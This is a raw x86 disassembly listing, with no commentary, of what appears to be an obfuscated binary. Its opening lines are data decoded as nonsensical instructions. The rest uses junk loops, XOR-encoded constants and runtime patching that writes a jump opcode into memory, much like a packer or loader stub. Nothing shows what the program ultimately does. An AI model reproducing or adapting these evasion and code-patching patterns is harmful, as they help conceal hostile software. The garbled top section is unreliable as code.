  40e604:	arpl   WORD PTR [edi],dx
  40e606:	cmp    DWORD PTR [edi],ebx
  40e608:	loope  0x40e62b
  40e60a:	pushf  
  40e60b:	stos   BYTE PTR es:[edi],al
  40e60c:	xor    DWORD PTR [edx-0x65],ebp
  40e60f:	xchg   ebp,eax
  40e610:	push   eax
  40e611:	or     DWORD PTR [ebp+ebx*4+0x4a],ebx
  40e615:	lea    ecx,[esi]
  40e617:	sub    eax,0xda62ce4d
  40e61c:	mov    ebp,0x5ad0e0a7
  40e621:	popf   
  40e622:	and    BYTE PTR [ecx-0x7],0x4b
  40e626:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e627:	sbb    BYTE PTR [ebx-0x2399007d],dl
  40e62d:	and    eax,0xbad7026d
  40e632:	out    dx,al
  40e633:	leave  
  40e634:	js     0x40e5ec
  40e636:	and    eax,0xb9ed889
  40e63b:	push   ecx
  40e63c:	xchg   esp,eax
  40e63d:	imul   ecx,DWORD PTR [ebx],0x9649a857
  40e643:	push   ebx
  40e644:	sysret 
  40e646:	mov    ah,0x31
  40e648:	ret    0x6ae8
  40e64b:	jge    0x40e699
  40e64d:	pop    ebx
  40e64e:	in     eax,dx
  40e64f:	jl     0x40e63c
  40e651:	jns    0x40e65a
  40e653:	jmp    0xffd4:0x24944d93
  40e65a:	cmp    esi,edx
  40e65c:	loope  0x40e6d8
  40e65e:	enter  0x1f01,0x18
  40e662:	dec    ebx
  40e663:	jnp    0x40e6c6
  40e665:	xor    ch,BYTE PTR [ecx]
  40e667:	fs nop
  40e669:	rol    BYTE PTR [esi+ebp*1+0x26],cl
  40e66d:	xor    DWORD PTR [ebx-0x48fe9b7f],esi
  40e673:	add    BYTE PTR [ebx-0x28],bh
  40e676:	in     al,dx
  40e677:	sub    BYTE PTR [edx+0x3784825e],ah
  40e67d:	mov    ds:0xe7c41614,al
  40e682:	sbb    cl,0x7f
  40e685:	fcomp  QWORD PTR [edi+0x478deca2]
  40e68b:	pop    eax
  40e68c:	imul   DWORD PTR [ebx+ebp*1+0x2a]
  40e690:	sti    
  40e691:	icebp  
  40e692:	mov    cl,0x62
  40e694:	cmp    eax,0xb7d74601
  40e699:	dec    esi
  40e69a:	cwd    
  40e69c:	pop    es
  40e69d:	ret    0xa7b5
  40e6a0:	xchg   ebp,eax
  40e6a1:	add    edi,esi
  40e6a3:	call   DWORD PTR [eax]
  40e6a5:	cmp    ch,BYTE PTR [esi]
  40e6a7:	call   0x7f10657d
  40e6ac:	ins    DWORD PTR es:[edi],dx
  40e6ad:	adc    esi,DWORD PTR [bp+di+0x63]
  40e6b1:	dec    edi
  40e6b2:	div    BYTE PTR [edi]
  40e6b4:	fadd   QWORD PTR [edi]
  40e6b6:	call   0x5dad:0xdbb3c6e
  40e6bd:	adc    ebx,0xffffff97
  40e6c0:	dec    edi
  40e6c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e6c2:	daa    
  40e6c3:	sub    al,0xd0
  40e6c5:	xlat   BYTE PTR ds:[ebx]
  40e6c6:	inc    edx
  40e6c7:	imul   edx,DWORD PTR [ecx+0x8c2c95f],0xec8b5500
  40e6d1:	sub    esp,0xa8
  40e6d7:	sbb    DWORD PTR ds:0x434693,0x1bda
  40e6e1:	push   ebx
  40e6e2:	sbb    DWORD PTR ds:0x434643,0x5a23
  40e6ec:	push   esi
  40e6ed:	inc    DWORD PTR ds:0x4345c7
  40e6f3:	push   edi
  40e6f4:	and    DWORD PTR ds:0x4345bb,0x6624
  40e6fe:	push   0x414c56
  40e703:	adc    DWORD PTR ds:0x434583,0x6b43
  40e70d:	call   DWORD PTR ds:0x41340c
  40e713:	test   eax,eax
  40e715:	mov    DWORD PTR ds:0x4345b7,0x267
  40e71f:	je     0x40e741
  40e725:	adc    DWORD PTR ds:0x434647,0x43455f
  40e72f:	xor    eax,eax
  40e731:	inc    eax
  40e732:	mov    DWORD PTR ds:0x43456b,0x5274
  40e73c:	jmp    0x40f150
  40e741:	add    DWORD PTR ds:0x4345bb,ecx
  40e747:	mov    DWORD PTR [ebp-0x24],0xf89c8536
  40e74e:	and    DWORD PTR ds:0x434653,0x0
  40e758:	jmp    0x40e76a
  40e75d:	mov    edi,DWORD PTR ds:0x434653
  40e763:	inc    edi
  40e764:	mov    DWORD PTR ds:0x434653,edi
  40e76a:	cmp    DWORD PTR ds:0x434653,0x16
  40e771:	jae    0x40e855
  40e777:	cmp    DWORD PTR ds:0x434653,0xd
  40e77e:	jne    0x40e79e
  40e784:	push   0x43456b
  40e789:	push   0x6202
  40e78e:	push   0x434708
  40e793:	push   0x4347f1
  40e798:	call   DWORD PTR ds:0x413344
  40e79e:	cmp    DWORD PTR ds:0x434653,0xc
  40e7a5:	jne    0x40e7b8
  40e7ab:	mov    edi,DWORD PTR ds:0x434653
  40e7b1:	inc    edi
  40e7b2:	mov    DWORD PTR ds:0x434653,edi
  40e7b8:	jmp    0x40e75d
  40e7bd:	and    DWORD PTR ds:0x4345fb,0x0
  40e7c7:	jmp    0x40e7d9
  40e7cc:	mov    edi,DWORD PTR ds:0x4345fb
  40e7d2:	inc    edi
  40e7d3:	mov    DWORD PTR ds:0x4345fb,edi
  40e7d9:	cmp    DWORD PTR ds:0x4345fb,0x11
  40e7e0:	jae    0x40e855
  40e7e6:	cmp    DWORD PTR ds:0x4345fb,0x1c
  40e7ed:	jne    0x40e806
  40e7f3:	push   0x43489f
  40e7f8:	push   DWORD PTR [ebp-0x24]
  40e7fb:	push   0x501d
  40e800:	call   DWORD PTR ds:0x413348
  40e806:	jmp    0x40e7cc
  40e80b:	mov    DWORD PTR ds:0x4345bb,0x17
  40e815:	cmp    DWORD PTR ds:0x4345bb,0x0
  40e81c:	je     0x40e855
  40e822:	cmp    DWORD PTR ds:0x4345bb,0x24
  40e829:	jne    0x40e83d
  40e82f:	push   0x3379
  40e834:	push   DWORD PTR [ebp-0x24]
  40e837:	call   DWORD PTR ds:0x4130c8
  40e83d:	mov    ecx,DWORD PTR ds:0x4345bb
  40e843:	dec    ecx
  40e844:	mov    DWORD PTR ds:0x4345bb,ecx
  40e84a:	jmp    0x40e815
  40e84f:	sub    DWORD PTR ds:0x43460b,edx
  40e855:	mov    DWORD PTR [ebp-0x4],0xf89c8539
  40e85c:	sbb    DWORD PTR ds:0x43463f,0x434587
  40e866:	lea    eax,[ebp-0x2c]
  40e869:	movzx  ecx,BYTE PTR ds:0x434573
  40e870:	and    ecx,DWORD PTR ds:0x43464f
  40e876:	mov    DWORD PTR ds:0x434573,ecx
  40e87c:	mov    DWORD PTR [ebp-0x18],eax
  40e87f:	mov    DWORD PTR ds:0x4345c7,0x13
  40e889:	cmp    DWORD PTR ds:0x4345c7,0x0
  40e890:	je     0x40e94f
  40e896:	cmp    DWORD PTR ds:0x4345c7,0x3
  40e89d:	jne    0x40e8b6
  40e8a3:	push   0x8243
  40e8a8:	push   0x5b51
  40e8ad:	push   DWORD PTR [ebp-0x18]
  40e8b0:	call   DWORD PTR ds:0x4130cc
  40e8b6:	cmp    DWORD PTR ds:0x4345c7,0x4
  40e8bd:	jne    0x40e8d0
  40e8c3:	mov    esi,DWORD PTR ds:0x4345c7
  40e8c9:	dec    esi
  40e8ca:	mov    DWORD PTR ds:0x4345c7,esi
  40e8d0:	xor    esi,esi
  40e8d2:	add    esi,DWORD PTR ds:0x4345c7
  40e8d8:	dec    esi
  40e8d9:	mov    DWORD PTR ds:0x4345c7,esi
  40e8df:	jmp    0x40e889
  40e8e4:	and    DWORD PTR ds:0x4345fb,0x0
  40e8ee:	jmp    0x40e900
  40e8f3:	mov    edi,DWORD PTR ds:0x4345fb
  40e8f9:	inc    edi
  40e8fa:	mov    DWORD PTR ds:0x4345fb,edi
  40e900:	cmp    DWORD PTR ds:0x4345fb,0x19
  40e907:	jae    0x40e94f
  40e90d:	cmp    DWORD PTR ds:0x4345fb,0xd
  40e914:	jne    0x40e92a
  40e91a:	push   0x6845
  40e91f:	push   0x434773
  40e924:	call   DWORD PTR ds:0x41334c
  40e92a:	cmp    DWORD PTR ds:0x4345fb,0xc
  40e931:	jne    0x40e944
  40e937:	mov    edi,DWORD PTR ds:0x4345fb
  40e93d:	inc    edi
  40e93e:	mov    DWORD PTR ds:0x4345fb,edi
  40e944:	jmp    0x40e8f3
  40e949:	sub    DWORD PTR ds:0x4345bf,edi
  40e94f:	lea    eax,[ebp-0x30]
  40e952:	mov    ecx,DWORD PTR ds:0x434607
  40e958:	adc    DWORD PTR ds:0x434637,ecx
  40e95e:	mov    DWORD PTR [ebp-0x14],eax
  40e961:	mov    esi,DWORD PTR ds:0x43459b
  40e967:	xor    ecx,ecx
  40e969:	or     ecx,DWORD PTR ds:0x4345d7
  40e96f:	sub    esi,ecx
  40e971:	or     esi,DWORD PTR [esi+ecx*1]
  40e974:	mov    eax,ds:0x414afe
  40e979:	mov    ebx,DWORD PTR ds:0x434633
  40e97f:	mov    ebx,DWORD PTR [ebx]
  40e981:	sub    DWORD PTR ds:0x43457f,ebx
  40e987:	mov    eax,DWORD PTR [eax+0x1c8]
  40e98d:	mov    eax,DWORD PTR [eax]
  40e98f:	or     edi,0x2360
  40e995:	mov    ecx,DWORD PTR [ebp-0x14]
  40e998:	mov    esi,0x7510851
  40e99d:	and    DWORD PTR ds:0x4345c7,0x6472
  40e9a7:	xor    eax,esi
  40e9a9:	sbb    edi,DWORD PTR ds:0x43457b
  40e9af:	mov    edi,0x327299
  40e9b4:	xor    DWORD PTR ds:0x43457b,ebx
  40e9ba:	add    eax,edi
  40e9bc:	mov    DWORD PTR [ecx],eax
  40e9be:	mov    eax,ds:0x414dae
  40e9c3:	movzx  ebx,WORD PTR ds:0x434677
  40e9ca:	cmp    eax,0x22c02f45
  40e9cf:	mov    eax,DWORD PTR [ebp-0x4]
  40e9d2:	movzx  ebx,BYTE PTR ds:0x434647
  40e9d9:	mov    ebx,0xf89c853a
  40e9de:	je     0x40ea1a
  40e9e4:	sub    DWORD PTR ds:0x43467f,edi
  40e9ea:	mov    ecx,DWORD PTR [ebp-0x24]
  40e9ed:	xor    eax,esi
  40e9ef:	add    eax,edi
  40e9f1:	sbb    DWORD PTR ds:0x434683,0x3fff
  40e9fb:	imul   eax,ecx
  40e9fe:	mov    DWORD PTR ds:0x434577,0x22e4
  40ea08:	mov    DWORD PTR [ebp-0x24],eax
  40ea0b:	mov    DWORD PTR ds:0x4345c7,0x3208
  40ea15:	jmp    0x40eab6
  40ea1a:	add    DWORD PTR ds:0x43463f,0x154a
  40ea24:	xor    eax,esi
  40ea26:	sbb    DWORD PTR ds:0x4345c7,0x7bc1
  40ea30:	add    eax,edi
  40ea32:	mov    ds:0x414c12,eax
  40ea37:	movzx  eax,BYTE PTR ds:0x43463b
  40ea3e:	sub    DWORD PTR ds:0x43463f,eax
  40ea44:	mov    eax,DWORD PTR [ebp-0x24]
  40ea47:	xor    eax,esi
  40ea49:	adc    DWORD PTR ds:0x43460f,ebx
  40ea4f:	add    eax,edi
  40ea51:	not    ecx
  40ea53:	mov    ds:0x414dae,eax
  40ea58:	mov    eax,DWORD PTR [ebp-0x4]
  40ea5b:	mov    ecx,DWORD PTR ds:0x414c12
  40ea61:	xor    eax,esi
  40ea63:	xor    DWORD PTR ds:0x434583,0x434643
  40ea6d:	add    eax,edi
  40ea6f:	mov    DWORD PTR ds:0x43460b,0x4a46
  40ea79:	cmp    ecx,eax
  40ea7b:	jne    0x40eab6
  40ea81:	sbb    DWORD PTR ds:0x434583,0x4345cf
  40ea8b:	push   ebx
  40ea8c:	mov    DWORD PTR ds:0x43463f,0x49e8
  40ea96:	push   DWORD PTR [ebp-0x4]
  40ea99:	sbb    DWORD PTR ds:0x4345bf,0x7dd1
  40eaa3:	push   DWORD PTR [ebp-0x24]
  40eaa6:	adc    DWORD PTR ds:0x43456f,0x434583
  40eab0:	call   DWORD PTR ds:0x414c0a
  40eab6:	and    edx,DWORD PTR ds:0x434583
  40eabc:	mov    eax,ds:0x414afe
  40eac1:	mov    ecx,DWORD PTR ds:0x434613
  40eac7:	and    DWORD PTR ds:0x4345c3,ecx
  40eacd:	mov    eax,DWORD PTR [eax+0x18c]
  40ead3:	sub    ecx,edx
  40ead5:	mov    eax,DWORD PTR [eax]
  40ead7:	neg    ecx
  40ead9:	mov    DWORD PTR [ebp-0x44],eax
  40eadc:	mov    DWORD PTR [ebp-0x10],ebx
  40eadf:	sub    ecx,DWORD PTR ds:0x43468f
  40eae5:	mov    DWORD PTR [ebp-0x10],ebx
  40eae8:	and    DWORD PTR ds:0x4345bf,0x0
  40eaf2:	jmp    0x40eb04
  40eaf7:	mov    ecx,DWORD PTR ds:0x4345bf
  40eafd:	inc    ecx
  40eafe:	mov    DWORD PTR ds:0x4345bf,ecx
  40eb04:	cmp    DWORD PTR ds:0x4345bf,0x1d
  40eb0b:	jae    0x40eb61
  40eb11:	cmp    DWORD PTR ds:0x4345bf,0x7
  40eb18:	jne    0x40eb2c
  40eb1e:	push   DWORD PTR [ebp-0x18]
  40eb21:	push   0x7577
  40eb26:	call   DWORD PTR ds:0x4130d0
  40eb2c:	cmp    DWORD PTR ds:0x4345bf,0x6
  40eb33:	jne    0x40eb48
  40eb39:	xor    ecx,ecx
  40eb3b:	add    ecx,DWORD PTR ds:0x4345bf
  40eb41:	inc    ecx
  40eb42:	mov    DWORD PTR ds:0x4345bf,ecx
  40eb48:	jmp    0x40eaf7
  40eb4d:	xor    edx,edx
  40eb4f:	or     edx,DWORD PTR ds:0x4345c7
  40eb55:	sbb    edx,DWORD PTR ds:0x434687
  40eb5b:	mov    DWORD PTR ds:0x4345c7,edx
  40eb61:	mov    DWORD PTR [ebp-0x10],ebx
  40eb64:	mov    ecx,DWORD PTR ds:0x43468b
  40eb6a:	or     DWORD PTR ds:0x43463b,ecx
  40eb70:	mov    DWORD PTR [ebp-0x14],0xf89c8536
  40eb77:	or     eax,edx
  40eb79:	mov    DWORD PTR [ebp-0x10],ebx
  40eb7c:	mov    DWORD PTR [ebp-0x10],0xf89c853e
  40eb83:	xor    ecx,DWORD PTR ds:0x4345b7
  40eb89:	mov    eax,DWORD PTR [ebp-0x24]
  40eb8c:	and    edx,0x522c
  40eb92:	mov    ecx,DWORD PTR [ebp-0x4]
  40eb95:	and    DWORD PTR ds:0x43468f,edx
  40eb9b:	mov    edx,DWORD PTR [ebp-0x4]
  40eb9e:	or     DWORD PTR ds:0x43468b,0x434647
  40eba8:	xor    edx,esi
  40ebaa:	sub    DWORD PTR ds:0x4345cf,0x434587
  40ebb4:	xor    ecx,esi
  40ebb6:	adc    DWORD PTR ds:0x43463f,0x43467b
  40ebc0:	add    ecx,edx
  40ebc2:	mov    edx,DWORD PTR [ebp-0x4]
  40ebc5:	adc    DWORD PTR ds:0x434577,0x4345f7
  40ebcf:	xor    eax,esi
  40ebd1:	xor    edx,esi
  40ebd3:	adc    DWORD PTR ds:0x434563,0x6faf
  40ebdd:	add    eax,edi
  40ebdf:	mov    DWORD PTR ds:0x434603,0x13
  40ebe9:	lea    ecx,[ecx+edx*1+0x9757cb]
  40ebf0:	mov    DWORD PTR ds:0x4345bb,0x74ca
  40ebfa:	mov    DWORD PTR [ebp-0x20],eax
  40ebfd:	mov    DWORD PTR ds:0x4345c3,0x777a
  40ec07:	cmp    eax,ecx
  40ec09:	mov    DWORD PTR ds:0x434693,0x6f86
  40ec13:	ja     0x40ed7b
  40ec19:	jmp    0x40ec27
  40ec1e:	adc    DWORD PTR ds:0x4345fb,edi
  40ec24:	mov    eax,DWORD PTR [ebp-0x20]
  40ec27:	add    DWORD PTR ds:0x434683,0x32bd
  40ec31:	mov    ecx,DWORD PTR [ebp-0x4]
  40ec34:	xor    ecx,esi
  40ec36:	xor    DWORD PTR ds:0x434567,0x43460f
  40ec40:	lea    eax,[ecx+eax*1+0x327299]
  40ec47:	push   eax
  40ec48:	and    DWORD PTR ds:0x434613,0x0
  40ec52:	xor    eax,eax
  40ec54:	or     eax,DWORD PTR ds:0x434613
  40ec5a:	inc    eax
  40ec5b:	mov    ds:0x434613,eax
  40ec60:	cmp    DWORD PTR ds:0x434613,0x10
  40ec67:	jne    0x40ec76
  40ec6d:	push   DWORD PTR [ebp-0x1c]
  40ec70:	call   DWORD PTR ds:0x413350
  40ec76:	cmp    DWORD PTR ds:0x434613,0xf
  40ec7d:	jne    0x40ec91
  40ec83:	xor    eax,eax
  40ec85:	add    eax,DWORD PTR ds:0x434613
  40ec8b:	inc    eax
  40ec8c:	mov    ds:0x434613,eax
  40ec91:	cmp    DWORD PTR ds:0x434613,0x1c
  40ec98:	jb     0x40ec52
  40ec9e:	movzx  eax,BYTE PTR ds:0x434563
  40eca5:	adc    eax,DWORD PTR ds:0x4345fb
  40ecab:	mov    ds:0x434563,eax
  40ecb0:	mov    eax,DWORD PTR [ebp-0x14]
  40ecb3:	xor    eax,esi
  40ecb5:	mov    DWORD PTR ds:0x4345bf,0x3b17
  40ecbf:	lea    eax,[ebp+eax*1+0x3272a1]
  40ecc6:	sub    DWORD PTR ds:0x434677,0x434583
  40ecd0:	push   eax
  40ecd1:	and    eax,DWORD PTR ds:0x4345fb
  40ecd7:	mov    eax,ds:0x414afe
  40ecdc:	adc    DWORD PTR ds:0x4345b7,0x7c2
  40ece6:	push   DWORD PTR [eax+0x1bc]
  40ecec:	call   0x4028d7
  40ecf1:	mov    eax,DWORD PTR [ebp-0x4]
  40ecf4:	mov    ecx,DWORD PTR [ebp-0x20]
  40ecf7:	mov    edx,DWORD PTR ds:0x43467b
  40ecfd:	or     DWORD PTR ds:0x434693,edx
  40ed03:	xor    eax,esi
  40ed05:	lea    eax,[ecx+eax*1+0x327299]
  40ed0c:	mov    ecx,DWORD PTR [ebp-0x4]
  40ed0f:	or     DWORD PTR ds:0x4345c3,edi
  40ed15:	mov    edx,DWORD PTR [ebp-0x4]
  40ed18:	sub    DWORD PTR ds:0x4345f7,0x283f
  40ed22:	xor    edx,esi
  40ed24:	xor    DWORD PTR ds:0x434653,0x4345b7
  40ed2e:	xor    ecx,esi
  40ed30:	add    ecx,edx
  40ed32:	mov    edx,DWORD PTR [ebp-0x4]
  40ed35:	and    DWORD PTR ds:0x434677,0x43457f
  40ed3f:	xor    edx,esi
  40ed41:	mov    DWORD PTR ds:0x4345b7,0x5401
  40ed4b:	lea    ecx,[ecx+edx*1+0x9757cb]
  40ed52:	mov    DWORD PTR ds:0x434587,0x25c8
  40ed5c:	mov    DWORD PTR [ebp-0x20],eax
  40ed5f:	mov    DWORD PTR ds:0x4345bf,0x56d4
  40ed69:	cmp    eax,ecx
  40ed6b:	mov    DWORD PTR ds:0x434587,0x74b6
  40ed75:	jbe    0x40ec1e
  40ed7b:	mov    DWORD PTR ds:0x43467f,0x4be2
  40ed85:	mov    eax,DWORD PTR [ebp+0xc]
  40ed88:	add    DWORD PTR ds:0x434687,edx
  40ed8e:	mov    ds:0x414982,eax
  40ed93:	mov    eax,DWORD PTR [ebp+0x10]
  40ed96:	mov    ds:0x414bd6,eax
  40ed9b:	and    DWORD PTR ds:0x434647,0x0
  40eda5:	mov    ecx,DWORD PTR ds:0x434647
  40edab:	inc    ecx
  40edac:	mov    DWORD PTR ds:0x434647,ecx
  40edb2:	cmp    DWORD PTR ds:0x434647,0x1f
  40edb9:	jne    0x40edca
  40edbf:	push   0x4348db
  40edc4:	call   DWORD PTR ds:0x413354
  40edca:	cmp    DWORD PTR ds:0x434647,0x13
  40edd1:	jb     0x40eda5
  40edd7:	add    ecx,eax
  40edd9:	mov    eax,ds:0x414982
  40edde:	inc    ecx
  40eddf:	mov    ecx,DWORD PTR [ebp-0x18]
  40ede2:	sub    DWORD PTR ds:0x4345cf,0x1b10
  40edec:	push   DWORD PTR [ebp-0x44]
  40edef:	or     DWORD PTR ds:0x434643,0x434677
  40edf9:	sub    eax,edi
  40edfb:	sub    DWORD PTR ds:0x43457f,0x43456f
  40ee05:	push   DWORD PTR [ebp-0x30]
  40ee08:	adc    DWORD PTR ds:0x4345bb,0x5064
  40ee12:	xor    eax,esi
  40ee14:	mov    DWORD PTR [ecx],eax
  40ee16:	push   DWORD PTR [ebp-0x2c]
  40ee19:	call   0x40f157
  40ee1e:	sub    eax,edi
  40ee20:	adc    ecx,DWORD PTR ds:0x43456f
  40ee26:	xor    eax,esi
  40ee28:	mov    DWORD PTR ds:0x43457f,0x13
  40ee32:	cmp    DWORD PTR ds:0x43457f,0x0
  40ee39:	je     0x40ee7a
  40ee3f:	cmp    DWORD PTR ds:0x43457f,0x18
  40ee46:	jne    0x40ee68
  40ee4c:	push   0x4348db
  40ee51:	push   DWORD PTR [ebp-0xc]
  40ee54:	push   DWORD PTR [ebp-0x28]
  40ee57:	push   DWORD PTR [ebp-0x1c]
  40ee5a:	push   DWORD PTR [ebp-0x20]
  40ee5d:	push   0x2408
  40ee62:	call   DWORD PTR ds:0x413358
  40ee68:	mov    ecx,DWORD PTR ds:0x43457f
  40ee6e:	dec    ecx
  40ee6f:	mov    DWORD PTR ds:0x43457f,ecx
  40ee75:	jmp    0x40ee32
  40ee7a:	mov    DWORD PTR [ebp+0xc],eax
  40ee7d:	mov    ecx,DWORD PTR [ebp-0x4]
  40ee80:	mov    eax,DWORD PTR [ebp+0xc]
  40ee83:	xor    ecx,esi
  40ee85:	add    ecx,edi
  40ee87:	xor    edx,edx
  40ee89:	div    ecx
  40ee8b:	mov    ecx,DWORD PTR [ebp-0x24]
  40ee8e:	cmp    ecx,eax
  40ee90:	jne    0x40f0b9
  40ee96:	mov    eax,ds:0x414afe
  40ee9b:	mov    DWORD PTR [ebp+0x10],eax
  40ee9e:	mov    eax,ds:0x414c0e
  40eea3:	mov    DWORD PTR [ebp-0x50],eax
  40eea6:	mov    DWORD PTR [ebp-0x18],0xf89c8536
  40eead:	mov    DWORD PTR [ebp-0x20],0xf89c8539
  40eeb4:	mov    DWORD PTR [ebp-0x4c],0xf89cb536
  40eebb:	mov    DWORD PTR [ebp-0x64],0xf89f0536
  40eec2:	mov    DWORD PTR [ebp-0x60],0xf89c85f6
  40eec9:	mov    DWORD PTR [ebp-0x54],0xf89c85d6
  40eed0:	mov    eax,DWORD PTR [ebp-0x18]
  40eed3:	xor    eax,esi
  40eed5:	add    eax,edi
  40eed7:	mov    DWORD PTR [ebp-0xc],eax
  40eeda:	mov    DWORD PTR [ebp-0x3c],0xf89c853d
  40eee1:	mov    BYTE PTR [ebp-0x25],0x67
  40eee5:	mov    eax,DWORD PTR [ebp-0x18]
  40eee8:	xor    eax,esi
  40eeea:	add    eax,edi
  40eeec:	mov    DWORD PTR [ebp-0xc],eax
  40eeef:	mov    eax,DWORD PTR [ebp-0x54]
  40eef2:	xor    eax,esi
  40eef4:	add    eax,edi
  40eef6:	mov    DWORD PTR [ebp-0x40],eax
  40eef9:	mov    eax,DWORD PTR [ebp-0x4c]
  40eefc:	xor    eax,esi
  40eefe:	add    eax,edi
  40ef00:	mov    DWORD PTR [ebp-0x38],eax
  40ef03:	mov    eax,DWORD PTR [ebp-0x3c]
  40ef06:	xor    eax,esi
  40ef08:	add    eax,edi
  40ef0a:	mov    DWORD PTR [ebp-0x34],eax
  40ef0d:	lea    eax,[ebp-0xa8]
  40ef13:	mov    DWORD PTR [ebp+0xc],eax
  40ef16:	mov    eax,DWORD PTR [ebp-0x18]
  40ef19:	mov    DWORD PTR [ebp-0x14],eax
  40ef1c:	mov    eax,DWORD PTR [ebp-0x20]
  40ef1f:	mov    DWORD PTR [ebp-0x5c],ebx
  40ef22:	mov    DWORD PTR [ebp-0x10],eax
  40ef25:	mov    eax,DWORD PTR [ebp-0x5c]
  40ef28:	mov    ecx,DWORD PTR [ebp+0xc]
  40ef2b:	xor    eax,esi
  40ef2d:	add    eax,0x327299
  40ef32:	mov    DWORD PTR [ecx],eax
  40ef34:	mov    eax,DWORD PTR [ebp-0x14]
  40ef37:	mov    ecx,DWORD PTR [ebp+0xc]
  40ef3a:	xor    eax,esi
  40ef3c:	add    eax,edi
  40ef3e:	mov    DWORD PTR [ecx+0x4],eax
  40ef41:	mov    eax,DWORD PTR [ebp-0x34]
  40ef44:	mov    ecx,DWORD PTR [ebp+0xc]
  40ef47:	mov    DWORD PTR [ecx+0x8],eax
  40ef4a:	mov    eax,DWORD PTR [ebp-0x38]
  40ef4d:	mov    ecx,DWORD PTR [ebp+0xc]
  40ef50:	mov    DWORD PTR [ecx+0xc],eax
  40ef53:	mov    eax,DWORD PTR [ebp-0x40]
  40ef56:	mov    ecx,DWORD PTR [ebp+0xc]
  40ef59:	mov    DWORD PTR [ecx+0x10],eax
  40ef5c:	mov    eax,eax
  40ef5e:	mov    eax,DWORD PTR [ebp-0x10]
  40ef61:	xor    eax,esi
  40ef63:	add    eax,edi
  40ef65:	je     0x40ef96
  40ef6b:	lea    eax,[ebp-0xa8]
  40ef71:	push   eax
  40ef72:	mov    eax,DWORD PTR [ebp-0x20]
  40ef75:	xor    eax,esi
  40ef77:	add    eax,edi
  40ef79:	push   eax
  40ef7a:	mov    eax,DWORD PTR [ebp+0x10]
  40ef7d:	add    eax,0xaa
  40ef82:	push   eax
  40ef83:	mov    eax,DWORD PTR [ebp+0x10]
  40ef86:	mov    eax,DWORD PTR [eax+0x198]
  40ef8c:	push   DWORD PTR [eax]
  40ef8e:	call   0x411333
  40ef93:	mov    DWORD PTR [ebp-0x8],eax
  40ef96:	cmp    DWORD PTR [ebp-0x8],0x0
  40ef9a:	je     0x40f0b9
  40efa0:	lea    eax,[ebp-0xc]
  40efa3:	mov    DWORD PTR [ebp-0x38],eax
  40efa6:	mov    eax,DWORD PTR [ebp-0x60]
  40efa9:	xor    eax,esi
  40efab:	add    eax,edi
  40efad:	mov    DWORD PTR [ebp-0x40],eax
  40efb0:	mov    eax,DWORD PTR [ebp-0x3c]
  40efb3:	xor    eax,esi
  40efb5:	add    eax,edi
  40efb7:	mov    DWORD PTR [ebp-0x10],eax
  40efba:	mov    eax,DWORD PTR [ebp-0x8]
  40efbd:	mov    DWORD PTR [ebp-0x14],eax
  40efc0:	lea    eax,[ebp-0xa8]
  40efc6:	mov    DWORD PTR [ebp+0xc],eax
  40efc9:	mov    eax,DWORD PTR [ebp-0x18]
  40efcc:	mov    DWORD PTR [ebp-0x18],eax
  40efcf:	mov    eax,DWORD PTR [ebp-0x20]
  40efd2:	mov    DWORD PTR [ebp-0x48],ebx
  40efd5:	mov    DWORD PTR [ebp-0x34],eax
  40efd8:	mov    eax,DWORD PTR [ebp-0x48]
  40efdb:	mov    ecx,DWORD PTR [ebp+0xc]
  40efde:	xor    eax,esi
  40efe0:	add    eax,0x327299
  40efe5:	mov    DWORD PTR [ecx],eax
  40efe7:	mov    eax,DWORD PTR [ebp-0x14]
  40efea:	mov    ecx,DWORD PTR [ebp+0xc]
  40efed:	mov    DWORD PTR [ecx+0x4],eax
  40eff0:	mov    eax,DWORD PTR [ebp-0x10]
  40eff3:	mov    ecx,DWORD PTR [ebp+0xc]
  40eff6:	mov    DWORD PTR [ecx+0x8],eax
  40eff9:	mov    eax,DWORD PTR [ebp-0x40]
  40effc:	mov    ecx,DWORD PTR [ebp+0xc]
  40efff:	mov    DWORD PTR [ecx+0xc],eax
  40f002:	mov    eax,DWORD PTR [ebp-0x38]
  40f005:	mov    ecx,DWORD PTR [ebp+0xc]
  40f008:	mov    DWORD PTR [ecx+0x10],eax
  40f00b:	mov    eax,eax
  40f00d:	mov    eax,DWORD PTR [ebp-0x14]
  40f010:	test   eax,eax
  40f012:	mov    eax,DWORD PTR [ebp-0x34]
  40f015:	jne    0x40f01e
  40f01b:	mov    eax,DWORD PTR [ebp-0x18]
  40f01e:	xor    eax,esi
  40f020:	add    eax,edi
  40f022:	test   eax,eax
  40f024:	je     0x40f052
  40f02a:	lea    eax,[ebp-0xa8]
  40f030:	push   eax
  40f031:	mov    eax,DWORD PTR [ebp-0x20]
  40f034:	xor    eax,esi
  40f036:	add    eax,edi
  40f038:	push   eax
  40f039:	mov    eax,DWORD PTR [ebp+0x10]
  40f03c:	add    eax,0xee
  40f041:	push   eax
  40f042:	mov    eax,DWORD PTR [ebp+0x10]
  40f045:	mov    eax,DWORD PTR [eax+0x198]
  40f04b:	push   DWORD PTR [eax]
  40f04d:	call   0x411333
  40f052:	mov    ecx,DWORD PTR [ebp-0x3c]
  40f055:	xor    ecx,esi
  40f057:	mov    eax,0xffcd8d67
  40f05c:	sub    eax,ecx
  40f05e:	sub    eax,DWORD PTR [ebp-0x8]
  40f061:	mov    ecx,DWORD PTR [ebp-0x50]
  40f064:	add    ecx,eax
  40f066:	mov    eax,DWORD PTR [ebp-0x8]
  40f069:	mov    DWORD PTR [eax+0x1],ecx
  40f06c:	mov    al,BYTE PTR [ebp-0x25]
  40f06f:	mov    ecx,DWORD PTR [ebp-0x8]
  40f072:	xor    al,0x44
  40f074:	sub    al,0x3a
  40f076:	mov    BYTE PTR [ecx],al
  40f078:	lea    eax,[ebp-0x8]
  40f07b:	inc    BYTE PTR [eax]
  40f07d:	inc    eax
  40f07e:	push   eax
  40f07f:	pop    ecx
  40f080:	dec    ecx
  40f081:	xchg   ecx,edx
  40f083:	dec    BYTE PTR [edx]
  40f085:	push   DWORD PTR [ebp+0x10]
  40f088:	mov    eax,ds:0x414bba
  40f08d:	mov    eax,DWORD PTR [eax]
  40f08f:	push   DWORD PTR [eax]
  40f091:	lea    eax,ds:0x414bd6
  40f097:	push   DWORD PTR [eax]
  40f099:	lea    eax,ds:0x414982
  40f09f:	push   DWORD PTR [eax]
  40f0a1:	lea    eax,ds:0x414bb6
  40f0a7:	push   DWORD PTR [eax]
  40f0a9:	lea    eax,ds:0x414cda
  40f0af:	push   DWORD PTR [eax]
  40f0b1:	xchg   ebx,edx
